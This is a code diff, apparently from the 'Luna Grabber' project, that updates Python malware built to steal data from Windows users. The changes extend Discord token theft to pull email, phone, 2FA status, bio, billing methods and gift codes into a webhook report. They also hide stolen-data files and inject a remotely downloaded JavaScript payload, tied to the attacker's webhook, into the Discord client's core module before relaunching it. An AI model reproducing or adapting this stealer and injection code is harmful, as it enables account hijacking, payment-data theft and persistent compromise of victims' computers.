@@ -1,5 +1,6 @@
 import os
 import platform
+from tempfile import mkdtemp
 import difflib
 import threading
 import uuid
@@ -10,7 +11,6 @@ import sqlite3
 import psutil
 import json
 
-from tempfile import mkdtemp
 from json import loads
 from re import findall, match
 from shutil import copy2
@@ -103,8 +103,7 @@ def get_inf():
     ram = round(float(wmi.WMI().Win32_OperatingSystem()[
                 0].TotalVisibleMemorySize) / 1048576, 0)
 
-    embed.add_field(name="SYSTEM INFO", value=f'''```yaml
-PC Username: {pc_username}\nPC Name: {pc_name}\nOS: {computer_os}\n\nIP: {ip_address}\nMAC: {mac_address}\nHWID: {hwid}CPU: {cpu.Name}\nGPU: {gpu.Name}\nRAM: {ram}GB```''', inline=False)
+    embed.add_field(name="SYSTEM INFO", value=f'''`PC Username:` **{pc_username}**\n`PC Name:` **{pc_name}**\n`OS:` **{computer_os}**\n\n`IP:` **{ip_address}**\n`MAC:` **{mac_address}**\n`HWID:` **{hwid}**`CPU:` **{cpu.Name}**\n`GPU:` **{gpu.Name}**\n`RAM:` **{ram}GB**''', inline=False)
 
 @try_extract
 class grabtokens():
@@ -241,10 +240,25 @@ class grabtokens():
                 headers={"Authorization": token})
 
             username = r.json()['username'] + '#' + r.json()['discriminator']
-            uid = r.json()['id']
             phone = r.json()['phone']
             email = r.json()['email']
 
+            try:
+                if r.json()['bio'] == "":
+                    bio = "No bio was found"
+                else:
+                    bio = r.json()['bio']
+            except KeyError:
+                bio = "No bio was found"
+
+            try:
+                if r.json()['mfa_enabled'] == True:
+                    mfa = "✅"
+                if r.json()['mfa_enabled'] == False:
+                    mfa = "❌"
+            except KeyError:
+                mfa = '❌'
+                
             try:
                 if r.json()['premium_type'] == 1:
                     nitro = 'Nitro Classic'
@@ -253,8 +267,7 @@ class grabtokens():
             except KeyError :
                 nitro = 'None'
 
-            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources",
-                             headers=self.getheaders(token))
+            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token))
 
             if b.json() == []:
                 methods = "None"
@@ -268,8 +281,18 @@ class grabtokens():
                     else:
                         methods += "❓"
 
-            embed.add_field(name="DISCORD INFO", value=f'''```yaml
-Discord Username: {username} \nDiscord ID: {uid}\nEmail: {email}\n\nPhone: {phone}\nNitro: {nitro}\nBilling: {methods}\n\nToken: {token}```''', inline=False)
+            g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=self.getheaders(token))
+            try:
+                if "code" in g.text:
+                    codes = json.loads(g.text)
+                    for code in codes:
+                        all_codes = code['code']
+                        title = code['promotion']['outbound_title']
+            except:
+                all_codes = "❌ No gift codes found"
+                title = ""
+
+            embed.add_field(name="DISCORD INFO", value=f'''`Discord Username:` **{username}** \n`Email:` **{email}**\n`Phone:` **{phone}**\n\n`2FA:` **{mfa}**\n`Nitro:` **{nitro}**\n`Billing:` **{methods}**\n\n`About Me:` ```{bio}```\n`Token:` **{token}**\n`{title}:` **{all_codes}**''', inline=False)
 
 def ss():
     ImageGrab.grab(
@@ -398,9 +421,9 @@ class grabhistory():
             with open(".\\google-history.txt", "a") as f:
                 f.write("\nAll Google Search History:\n")
                 f.write("\n".join(history))
-        except Exception:
+        except Exception as e:
             with open(".\\google-history.txt", "a") as f:
-                f.write("\nNo google history was found :(")
+                f.write(f"\nNo google history was found :(\n{e}")
 
 
 @try_extract
@@ -480,6 +503,7 @@ class epicgamesdata():
                     if line.startswith("Data="):
                         eg_data = line.split('Data=')[1].strip()
                 g.write(eg_data)
+                hide(".\\epicgames-data.txt")
         except Exception as e:
             with open((".\\epicgames-data.txt"), 'w', encoding="cp437", errors='ignore') as g:
                 g.write("https://github.com/Smug246 | Epic Games Offline Data\n\n")
@@ -589,16 +613,18 @@ def cleanup():
 def hide(file):
     SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)
 
-def inject(webhook):
-    for _dir in os.listdir(os.getenv('localappdata')):
+def inject():
+    appdata = os.getenv("localappdata")
+    for _dir in os.listdir(appdata):
         if 'discord' in _dir.lower():
-            for __dir in os.listdir(os.path.abspath(os.getenv('localappdata')+os.sep+_dir)):
-                if re.match(r'app-(\d*\.\d*)*', __dir):
-                    abspath = os.path.abspath(os.getenv('localappdata')+os.sep+_dir+os.sep+__dir)
+            for __dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
+                if match(r'app-(\d*\.\d*)*', __dir):
+                    abspath = os.path.abspath(appdata+os.sep+_dir+os.sep+__dir) 
                     f = requests.get("https://raw.githubusercontent.com/Smug246/Luna-Grabber-Builder/main/injection.js").text.replace("%WEBHOOK%", webhook)
-                    with open(abspath+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
+                    modules_dir = os.listdir(abspath+'\\modules') 
+                    with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
                         indexFile.write(f)
-                    os.startfile(abspath+os.sep+_dir+'.exe')
+                    subprocess.call(["start", abspath+os.sep+"Discord.exe"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 class debug:
     def __init__(self):
